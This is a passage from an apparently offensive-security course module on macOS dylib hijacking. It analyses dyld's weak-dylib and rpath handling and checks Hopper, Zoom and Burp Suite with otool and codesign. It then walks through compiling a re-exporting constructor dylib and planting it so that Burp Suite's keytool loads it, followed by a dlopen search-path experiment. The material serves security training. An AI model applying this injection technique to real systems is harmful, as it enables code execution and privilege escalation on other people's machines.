Listing 66 - Flags being set in ImageLoaderMachO::doGetDependentLibraries

What's most important for us to observe in this case is that if LC_LOAD_WEAK_DYLIB is being used, the required flag is set to FALSE; otherwise, it is set to TRUE. As we'll learn later, this means that a process can start without crashing, even if a weak dylib is not found.

Next, the ImageLoader::recursiveLoadLibraries function resolves the rpath variables. These run-time dependent search paths can be specified with the LC_RPATH command in a Mach-O file, typically in a form similar to "@rpath/libssl.1.0.0.dylib". If the runtime needs to find our dylib's location dynamically upon load, the linker will rely on these search paths. These paths are commonly used for dylibs embedded in the application's bundle and can be retrieved by calling ImageLoaderMachO::getRPaths.

 1 void ImageLoaderMachO::getRPaths(const LinkContext& context, std::vector<const char*>& paths) const
 2 {
 3 	const uint32_t cmd_count = ((macho_header*)fMachOData)->ncmds;
 4 	const struct load_command* const cmds = (struct load_command*)&fMachOData[sizeof(macho_header)];
 5 	const struct load_command* cmd = cmds;
 6 	for (uint32_t i = 0; i < cmd_count; ++i) {
 7 		switch (cmd->cmd) {
 8 			case LC_RPATH:
 9 				const char* pathToAdd = NULL;
10 				const char* path = (char*)cmd + ((struct rpath_command*)cmd)->path.offset;
11 				if ( (strncmp(path, "@loader_path", 12) == 0) && ((path[12] == '/') || (path[12] == '\0')) ) {
12 					if ( !context.allowAtPaths && (context.mainExecutable == this) ) {
13 						dyld::warn("LC_RPATH %s in %s being ignored in restricted program because of @loader_path (Codesign main executable with Library Validation to allow @ paths)\n", path, this->getPath());
14 						break;
15 					}
16 					char resolvedPath[PATH_MAX];
17 					if ( realpath(this->getPath(), resolvedPath) != NULL ) {
18 						char newRealPath[strlen(resolvedPath) + strlen(path)];
19 						strcpy(newRealPath, resolvedPath);
20 						char* addPoint = strrchr(newRealPath,'/');
21 						if ( addPoint != NULL ) {
22 							strcpy(addPoint, &path[12]);
23 							pathToAdd = strdup(newRealPath);
24 						}
25 					}
26 				}
27 ...
Listing 67 - The ImageLoaderMachO::getRPaths function

As shown above, this function will again iterate through the list of Mach-O load commands (line 6) and act when LC_RPATH is found (line 8). Next, it will go through a series of checks, the most important of which occurs at lines 11-12.

Here, we will find a check for context.allowAtPaths followed by a check on the LC_RPATH command. The latter tests if the command starts with the @loader_path string, which represents the directory where the binary is located.

During the previous section, we found that context.allowAtPaths was set depending on whether the process was considered restricted or not, based on the various requirements ( gLinkContext.allowAtPaths = !isRestricted;). This means that in the case of restricted binaries, this command will be ignored while processing the main executable. If the code is not handling a restricted binary, the rpath will be resolved by the realpath function and added to a list.

Let's continue to inspect the recursiveLoadLibraries function.

...
for(unsigned int i=0; i < fLibraryCount; ++i){
  ...
	try {
			dependentLib = context.loadLibrary(requiredLibInfo.name, true, this->getPath(), &thisRPaths, cacheIndex);
	...
	catch (const char* msg) {
		if ( requiredLibInfo.required ) {
      ...
			throw newMsg;
		}
		free((void*)msg); 	// our free() will do nothing if msg is a string literal
		// ok if weak library not found
		dependentLib = NULL;
  ...
}
Listing 68 - Part of the recursiveLoadLibraries function

The recursiveLoadLibraries function will iterate through each dylib it found and try to load them within a try-catch block. To actually load a dylib, it will call loadLibrary, which will call a series of other functions to perform the loading. If any errors occur, an exception will be thrown. If we inspect the catch block, we find that the exception will be sent upwards, unless the requiredLibInfo.required is set to FALSE. If we recall, requiredLibInfo.required was set for the LC_LOAD_WEAK_DYLIB load command. This means that if this load command is used and an error occurs (for example, the dylib is not found), the application won't error out and will continue execution.

As the dylibs are being loaded, we resolve the dylib paths starting with @rpath. The @rpath "variable" name will be replaced by each run path-dependent search path that was found when parsing the LC_RPATH commands. These locations are searched sequentially, and the first dylib found will be loaded.

For example, imagine we encounter a LC_LOAD_DYLIB command with the value of "@rpath/example.dylib", as well as two LC_RPATH commands with the values "/Application/Example.app/Contents/OldDylibs/" and "/Application/Example.app/Contents/Dylibs/". As a result, two paths will be searched for the given dylib in sequence:

/Application/Example.app/Contents/OldDylibs/example.dylib
/Application/Example.app/Contents/Dylibs/example.dylib
Based on what we have covered, there are two scenarios in which a dylib can be hijacked.

In the first case, an application uses the LC_LOAD_WEAK_DYLIB command, but the actual dylib does not exist. We can exploit this scenario by placing our own dylib in the expected location to be loaded.

The second scenario occurs when the @rpath search path order points to folders where the dylib is not found. Using our previous example, if /Application/Example.app/Contents/OldDylibs/example.dylib doesn't exist, and only /Application/Example.app/Contents/Dylibs/example.dylib exists, we can place our dylib in the first location, and it will be loaded instead of the actual dylib, as the search order encounters that location first.

Next, let's discuss a third option for hijacking dylib loading: dylib proxying. This is not a real hijack, since we need to tamper with the application; however, it still allows us to inject our code. If we have write access to the dylib files, we can use this method to simply swap the intended dylib with our own dylib by renaming the original dylib and pointing our dylib to the real one, re-exporting all of its offered functions. This allows us to load our binary without crashing the application.

There are a few restrictions on this attack, however, as discussed during our DYLD_INSERT_LIBRARIES analysis. If an application is compiled with hardened runtime or library validation enabled, and doesn't have the com.apple.security.cs.disable-library-validation entitlement set, dyld won't load libraries that were signed with different team IDs.

Next, let's learn more about how to find vulnerable applications that can be hijacked.

8.2.3. Finding Vulnerable Applications
The easiest way to discover vulnerable apps is by using Patrick Wardle's Dylib Hijack Scanner (DHS) tool. However, to understand the search process, we will do it manually.

We'll start by finding ways to discover apps vulnerable to dylib hijacking using LC_LOAD_WEAK_DYLIB. As an example, we'll use Hopper.

We can use otool to display all the load commands of the application. The output is lengthy, so we'll display only a subset of it below:

offsec@sonoma1 ~ % otool -l "/Applications/Hopper Disassembler v4.app/Contents/MacOS/Hopper Disassembler v4"
...
Load command 9
          cmd LC_LOAD_DYLINKER
      cmdsize 32
         name /usr/lib/dyld (offset 12)
...
Load command 12
          cmd LC_LOAD_DYLIB
      cmdsize 64
         name /usr/lib/swift/libswiftFoundation.dylib (offset 24)
   time stamp 2 Thu Jan  1 01:00:02 1970
      current version 1.0.0
compatibility version 1.0.0
...
Listing 69 - Output of otool for wish

Command 12 is an example of a regular LC_LOAD_DYLIB command specifying a full path. To search for LC_LOAD_WEAK_DYLIB commands, we can use grep to filter for them, as well as the -A 5 switch to display five more lines after a match is found. This command can also appear as Command 14. The important part is understanding the output.

offsec@sonoma1 ~ % otool -arch arm64 -l "/Applications/Hopper Disassembler v4.app/Contents/MacOS/Hopper Disassembler v4" | grep -A 5 "LC_LOAD_WEAK_DYLIB"
...
          cmd LC_LOAD_WEAK_DYLIB
      cmdsize 64
         name /usr/lib/swift/libswiftCoreImage.dylib (offset 24)
   time stamp 2 Thu Jan  1 01:00:02 1970
      current version 2.0.0
compatibility version 1.0.0
Listing 70 - LC_LOAD_WEAK_DYLIB command in wish

If we check the location /usr/lib/swift/libswiftCoreImage.dylib, we discover that the library is not found.

offsec@sonoma1 ~ % ls -l /usr/lib/swift/libswiftCoreImage.dylib
ls: /usr/lib/swift/libswiftCoreImage.dylib: No such file or directory
Listing 71 - Looking for /usr/lib/swift/libswiftCoreImage.dylib

Checking the code-signing properties of the binary, we find that it has library validation disabled, which will allow us to load a binary.

offsec@sonoma1 ~ % codesign -dv --entitlements - /Applications/Hopper\ Disassembler\ v4.app
Executable=/Applications/Hopper Disassembler v4.app/Contents/MacOS/Hopper Disassembler v4
Identifier=com.cryptic-apps.hopper-web-4
Format=app bundle with Mach-O universal (x86_64 arm64)
CodeDirectory v=20500 size=105833 flags=0x10000(runtime) hashes=3296+7 location=embedded
Signature size=8973
Timestamp=19 Oct 2023 at 17:47:23
Info.plist entries=37
TeamIdentifier=2AMA2753NF
Runtime Version=13.3.0
Sealed Resources version=2 rules=13 files=172
Internal requirements count=1 size=224
[Dict]
	[Key] com.apple.security.cs.allow-jit
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.allow-unsigned-executable-memory
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.debugger
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.disable-executable-page-protection
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.disable-library-validation
	[Value]
		[Bool] true
Listing 72 - Verifying code signing requirements of Hopper

This means if we were to place a dylib at /usr/lib/swift/libswiftCoreImage.dylib with the version specified in the output of otool (2.0.0), we could hijack the load of the dylib. Unfortunately, this location is protected by SIP, and thus less interesting; let's search for another application to exploit.

To hunt rpath-based dylib hijacking, we will examine an embedded Zoom app called airhost, which adds AirPlay functionality to the main application. We can replicate Listing {@inj_dylib_10} by installing Zoom. For this example, we will use Zoom v5.4.9. Let's begin by leveraging the otool utility again to check for any LC_RPATH commands in the Mach-O file.

offsec@sonoma1 ~ % otool -l /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/MacOS/airhost | grep LC_RPATH -A 2          
          cmd LC_RPATH
      cmdsize 40
         path @loader_path/../Frameworks (offset 12)
--
          cmd LC_RPATH
      cmdsize 40
         path @loader_path/../../../ (offset 12)
Listing 73 - LC_RPATH commands in Zoom

We need to resolve these paths in the context of the application. To understand more about @loader_path, let's turn to its man dyld page description. Listing 74 shows its definition, along with the commonly used @executable_path.

@executable_path/
  This variable is replaced with the path to the directory
  containing the main executable for the process. This
  is useful for loading dylibs/frameworks embedded
  in a .app directory. If the main executable file is
  at/some/path/My.app/Contents/MacOS/My and a framework dylib file is
  at /some/path/My.app/Contents/Frameworks/Foo.framework/Versions/A/Foo,
  then the framework load path could be encoded as
  @executable_path/../Frameworks/Foo.framework/Versions/A/Foo and
  the .app directory could be moved around in the file system and dyld
  will still be able to load the embedded framework.

@loader_path/
  This variable is replaced with the path to the directory
  containing the mach-o binary which contains the load command
  using @loader_path. Thus, in every binary, @loader_path resolves
  to a different path, whereas @executable_path always resolves
  to the same path. @loader_path is useful as the load path for a
  framework/dylib embedded in a plug-in, if the final file system
  location of the plugin-in unknown (so absolute paths cannot be
  used) or if the plug-in is used by multiple applications (so
  @executable_path cannot be used). If the plug-in mach-o file
  is at /some/path/Myfilter.plugin/Contents/MacOS/Myfilter and
  a framework dylib file is at /some/path/Myfilter.plugin/
  Contents/Frameworks/Foo.framework/Versions/A/Foo,
  then the framework load path could be encoded as
  @loader_path/../Frameworks/Foo.framework/Versions/A/Foo and the
  Myfilter.plugin directory could be moved around in the file system
  and dyld will still be able to load the embedded framework.
Listing 74 - Substract from dyld man page

Essentially, @loader_path always points to the directory containing the binary that includes the load command, while @executable_path points to the directory of the main executable. These variables resolve to the same location for the main binary but will be different for other binaries.

Let's go back to our example binary. In the case of /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/MacOS/airhost the @loader_path is /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/MacOS/. This means the run time-dependent paths will resolve as follows:

@loader_path/../Frameworks   -> /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/
@loader_path/../../../       -> /Applications/zoom.us.app/Contents/Frameworks/
Listing 75 - Resolving rpath variables

Now that we have a list of the paths, we need to retrieve the related dylibs that will be resolved. We can use otool again to find these.

offsec@sonoma1 ~ % otool -l /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/MacOS/airhost | grep @rpath
         name @rpath/libavcodec.58.dylib (offset 24)
         name @rpath/libavutil.56.dylib (offset 24)
         name @rpath/libswresample.3.dylib (offset 24)
         name @rpath/libssl.dylib (offset 24)
         name @rpath/libswscale.5.dylib (offset 24)
         name @rpath/libcrypto.dylib (offset 24)
Listing 76 - Displaying @rpath dependent dylibs in airhost

Next, let's check which of the dylibs above are available within each of the loader paths.

offsec@sonoma1 ~ % ls -l /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/*.dylib
-rwxr-xr-x  1 root  wheel  2883456 Oct 24 05:24  /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/libavcodec.59.dylib
-rwxr-xr-x  1 root  wheel   454544 Oct 24 05:24 /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/libavformat.59.dylib
-rwxr-xr-x  1 root  wheel   738128 Oct 24 05:24 /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/libavutil.57.dylib
-rwxr-xr-x  1 root  wheel   166176 Oct 24 05:24 /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/libswresample.4.dylib
-rwxr-xr-x  1 root  wheel   949408 Oct 24 05:24 /Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/libswscale.6.dylib

offsec@sonoma1 ~ % ls -l /Applications/zoom.us.app/Contents/Frameworks/*.dylib
-rwxr-xr-x  1 offsec  wheel  2383984 Jan 10  2021 /Applications/zoom.us.app/Contents/Frameworks/libcrypto.dylib
-rwxr-xr-x  1 offsec  wheel   273472 Jan 10  2021 /Applications/zoom.us.app/Contents/Frameworks/libjson.dylib
-rwxr-xr-x  1 offsec  wheel   504096 Jan 10  2021 /Applications/zoom.us.app/Contents/Frameworks/libssl.dylib
...
Listing 77 - Listing dylibs in the resolved rpath locations

Based on the above output, two of the dylibs, namely libcrypto.dylib and libssl.dylib, can be found only in the second location (/Applications/zoom.us.app/Contents/Frameworks/). This means if we can place a dylib named as one of these three in the first location (/Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/Frameworks/), we may be able to hijack execution.

However, we encounter a problem when we check the airhost app's digital signature, as it turns out to be hardened. Library validation is also not disabled, which means that even if we place our dylib here, it won't be loaded.

offsec@sonoma1 ~ % codesign -dv --entitlements - /Applications/zoom.us.app/Contents/Frameworks/airhost.app
Executable=/Applications/zoom.us.app/Contents/Frameworks/airhost.app/Contents/MacOS/airhost
Identifier=us.zoom.airhost
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=86811 flags=0x10000(runtime) hashes=2702+7 location=embedded
Signature size=9114
Timestamp=Oct 24, 2023 at 05:24:35
Info.plist entries=25
TeamIdentifier=BJ4HAAB9B3
Runtime Version=13.1.0
Sealed Resources version=2 rules=13 files=22
Internal requirements count=1 size=176
[Dict]
	[Key] com.apple.security.automation.apple-events
	[Value]
		[Bool] true
	[Key] com.apple.security.device.audio-input
	[Value]
		[Bool] true
	[Key] com.apple.security.device.camera
	[Value]
		[Bool] true
Listing 78 - Verifying code signature of airhost.app

We've hit a dead end again. In the next section, we'll examine a different application and perform a full dylib hijacking attack.

8.2.4. Vulnerable Applications Exercises
Repeat the steps we performed to verify dylib hijacking potential in the applications we discussed.

Investigate the application /Applications/Proxyman.app. Based on the LC_RPATH commands, the dylibs to be loaded, and the dylibs' location, is dylib hijacking possible? (It is not required that the application runs correctly to answer this question.)

8.2.5. Performing Dylib Hijacking
Let's exploit the web application testing tool Burp Suite. We will use version v2023_10_3_1. This application has a hijackable binary within its Java plugins located at /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool. If we examine the LC_RPATH commands, we'll find they refer once to the current directory, and next to ../lib.

offsec@sonoma1 ~ % otool -l "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool" | grep RPATH -B 1 -A 2
Load command 18
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/. (offset 12)
Load command 19
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/../lib (offset 12)
Listing 79 - Listing LC_RPATH commands for pack200

Next, let's check for any dylibs using the @rpath prefix.

offsec@sonoma1 ~ % otool -l "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool" | grep @rpath -A 3
         name @rpath/libjli.dylib (offset 24)
   time stamp 2 Thu Jan  1 01:00:02 1970
      current version 1.0.0
compatibility version 1.0.0
Listing 80 - Listing @rpath-dependent dylibs for pack200

As shown above, we find a dylib with a @rpath prefix called libjli.dylib. We'll take note of the version (1.0.0), since this will come into play as we build our malicious dylib later. Let's examine this path.

offsec@sonoma1 ~ % ls -l "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/"*.dylib

zsh: no matches found: /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/*.dylib
Listing 81 - Checking if dylibs exist on the paths

Reviewing the executable's directory (/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/), we find that there are no dylibs. This is good news! Based on the @loader_path order, it will check the executable's directory first, instead of the lib directory where the dylib is actually located, thus creating a dylib hijacking opportunity.

Next, we need to verify the entitlements, as well as whether codesigning allows dylib injection.

offsec@sonoma1 ~ % codesign -dv --entitlements - "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool"
Executable=/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool
Identifier=install4j.9806-1938-4586-6531.keytool
Format=Mach-O thin (arm64)
CodeDirectory v=20200 size=677 flags=0x10000(runtime) hashes=13+5 location=embedded
Signature size=8605
Timestamp=Oct 19, 2023 at 11:23:19
Info.plist=not bound
TeamIdentifier=N82YM748DZ
Sealed Resources=none
Internal requirements count=1 size=36
[Dict]
	[Key] com.apple.security.cs.allow-jit
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.allow-unsigned-executable-memory
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.disable-executable-page-protection
	[Value]
		[Bool] true
	[Key] com.apple.security.cs.disable-library-validation
	[Value]
		[Bool] true
Listing 82 - Checking code signature of keytool

Library validation is disabled, which confirms we can perform dylib hijacking.

When preparing our dylib, we need to ensure two things:

The version of the dylib should be the version expected by the loader.
The dylib should export everything expected by the application to avoid crashing the app.
To address the first issue, we'll need to make sure our dylib version is compatible with the current version and the compatibility version specified at the load command (which we found was 1.0.0). The current version is the minimum version, and the compatibility version is the maximum version, defined at xnu-10002.1.13/EXTERNAL_HEADERS/mach-o/loader.h.

/*
 * Dynamicly linked shared libraries are identified by two things.  The
 * pathname (the name of the library as found for execution), and the
 * compatibility version number.  The pathname must match and the compatibility
 * number in the user of the library must be greater than or equal to the
 * library being used.  The time stamp is used to record the time a library was
 * built and copied into user so it can be use to determined if the library used
 * at runtime is exactly the same as used to built the program.
 */
struct dylib {
    union lc_str  name;			/* library's path name */
    uint32_t timestamp;			/* library's build time stamp */
    uint32_t current_version;		/* library's current version number */
    uint32_t compatibility_version;	/* library's compatibility vers number*/
};
Listing 83 - dylib structure in loader.h

To solve the second requirement, we will re-export everything from the original library. In this case, the original library can be found at /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib.

We're ready to create a very simple dylib using the following code:

offsec@sonoma1 ~ % cat hijack.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv)
{
  NSLog(@"Dylib hijack successful in %s",argv[0]);
}
Listing 84 - Dylib source code

We can compile our dylib using the following command:

offsec@sonoma1 ~ % gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation hijack.m -Wl,-reexport_library,"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o hijack.dylib
Listing 85 - Compiling the dylib source code

Shown above, -current_version 1.0 -compatibility_version 1.0 specifies the version we need and -Wl,-reexport_library,"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" instructs gcc which dylib to re-export. If we inspect how this is currently inserted into the dylib, we find the following:

offsec@sonoma1 ~ % otool -l hijack.dylib| grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
      cmdsize 48
         name @rpath/libjli.dylib (offset 24)
Listing 86 - LC_REEXPORT_DYLIB command in our dylib

The LC_REEXPORT_DYLIB load command uses the @rpath variable to find the original dylib. We don't want this to be @rpath-dependent because that would result in a self-reference, thus the path would ultimately point to itself instead of the one we want to re-export. Instead, we'll need to specify the exact path location using the built-in install_name_tool utility.

offsec@sonoma1 ~ % install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" hijack.dylib
Listing 87 - Using install_name_tool to change LC_REEXPORT_DYLIB path in our dylib

The -change option specifies the path location that we are changing.

Checking the load command path again, it now points to our intended location.

offsec@sonoma1 ~ % otool -l hijack.dylib | grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
      cmdsize 136
         name /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
Listing 88 - The updated LC_REEXPORT_DYLIB command in our dylib

Our final step is to copy this file to the appropriate location and run the app.

offsec@sonoma1 ~ % cp hijack.dylib "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"

offsec@sonoma1 ~ % "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool"
2023-10-26 14:21:33.635 keytool[1293:24628] Dylib hijack successful in /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool
Key and Certificate Management Tool

Commands:

 -certreq            Generates a certificate request
...
Listing 89 - Successful dylib hijacking in pack200

Great! Listing 89 shows our log message printed, confirming we were able to successfully hijack the load of the dylib.

In this section, we completed a full walkthrough of the dylib hijacking technique to demonstrate how it can be used for code injection.

8.2.6. Dylib Hijacking Exercises
Repeat the steps to perform dylib hijacking in keytool

Perform dylib hijacking in /Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/rmiregistry.

8.2.7. Hijacking Dlopen
Finally, let's examine a third scenario for dylib hijacking. This occurs when an application tries to load a dylib using the dlopen function without specifying the full path. In this case, dyld will search through different paths. Let's examine the man page of dlopen, a section of which is displayed below, to understand where these paths are located.

SEARCHING

...

 When path does not contain a slash character (i.e. it is just a leaf name), 
 dlopen() will do searching. If $DYLD_LIBRARY_PATH was set at launch, dyld 
 will first look in that directory. Next, if the calling mach-o file or the 
 main executable specify an LC_RPATH, then dyld will look in those directories. 
 Next, if the process is unrestricted, dyld will search in the current working 
 directory. Lastly, for old binaries, dyld will try some fallbacks. If 
 $DYLD_FALLBACK_LIBRARY_PATH was set at launch, dyld will search in those 
 directories, otherwise, dyld will look in /usr/local/lib/ (if the process is 
 unrestricted), and then in /usr/lib/.
     
 ...
 
  If the main executable is a set[ug]id binary or codesigned with entitlements, 
  then all environment variables are ignored, and only a full path can be used.
Listing 90 - Part of dlopen man page

To summarize, dlopen will search the following paths:

$DYLD_LIBRARY_PATH
LC_RPATH
Current working directory (if unrestricted)
$DYLD_FALLBACK_LIBRARY_PATH
/usr/local/lib/ (if unrestricted)
/usr/lib/
Near the end of the man page, there's a note mentioning that if the set[ug]id bits are set or codesigned with entitlements, environment variables are ignored. While this is accurate information, it doesn't show the full picture. Realistically, dlopen will check whether a binary is restricted in the DYLD_INSERT_LIBRARIES section; we extensively analyzed the restriction cases for binaries.

Let's test this out. We can create a short C code that will try to open a non-existent dylib and determine where it's being searched for.

offsec@sonoma1 ~ % cat dltest.c
#include <dlfcn.h>

int main(void)
{
  dlopen("doesntexist.dylib",1);
}

offsec@sonoma1 ~ % gcc dltest.c -o dltest
Listing 91 - Examining the C code to test dlopen, and compiling it

We will run sudo fs_usage | grep doesntexist to monitor file system events and filter for the dylib we're attempting to load. Let's run the binary from the user's $HOME directory, as follows:

offsec@sonoma1 ~ % mkdir dl1
offsec@sonoma1 ~ % mkdir dl2
offsec@sonoma1 ~ % DYLD_LIBRARY_PATH=dl1 DYLD_FALLBACK_LIBRARY_PATH=dl2 ./dltest
Listing 92 - Run dltest

Next, we'll review the results, shown below.

offsec@sonoma1 ~ % sudo fs_usage | grep doesntexist
Password:
10:21:23  open              doesntexist.dylib                                          0.000008   dltest      
10:21:23  stat64            dl1/doesntexist.dylib                                      0.000010   dltest      
10:21:23  stat64            doesntexist.dylib                                          0.000002   dltest      
10:21:23  stat64            /System/Volumes/Preboot/Cryptexes/OSdoesntexist.dylib      0.000455   dltest      
10:21:23  stat64            /usr/lib/doesntexist.dylib                                 0.000011   dltest      
10:21:23  stat64            doesntexist.dylib                                          0.000001   dltest      
10:21:23  stat64            dl2/doesntexist.dylib                                      0.000022   dltest 
Listing 93 - Monitoring file system events with fs_usage

These results are slightly different from what is present in the man page. /usr/local/lib/ is not being searched at all. The location specified by DYLD_FALLBACK_LIBRARY_PATH is also checked. We also need to examine what happens when a binary is restricted.

offsec@sonoma1 ~ % cp dltest hardened-dltest

offsec@sonoma1 ~ % codesign -s offsec --option=runtime hardened-dltest
Listing 94 - Setting hardened runtime flag

Now that we have signed it with a hardened runtime flag, let's run DYLD_LIBRARY_PATH=dl1 DYLD_FALLBACK_LIBRARY_PATH=dl2 ./hardened-dltest.

offsec@sonoma1 ~ % sudo fs_usage | grep doesntexist
03:22:53  open              doesntexist.dylib                                       0.000019   hardened-dlt
03:22:53  stat64            /System/Volumes/Preboot/Cryptexes/OSdoesntexist.dylib   0.000012   hardened-dlt
03:22:53  stat64            /usr/lib/doesntexist.dylib                              0.000005   hardened-dlt
Listing 95 - Monitoring file system events with fs_usage

As expected, all environment variables are ignored, and only the /usr/lib directory will be searched. This location is protected by SIP, meaning that even as root we can't write to this directory, making it impossible for us to hijack a restricted binary.

8.2.8. Hijacking Dlopen Exercises
Repeat the previous steps to observe path resolution of dlopen.
Make a dylib to hijack the dlopen execution.
How does dlopen behave differently if the path seems like a framework path?
8.3. Wrapping Up
In this module, we explored multiple methods for injecting a dylib into processes. We examined the limitations of these methods and practiced each technique. These techniques will be used in later modules, since process injection is a key method to gain additional system privileges.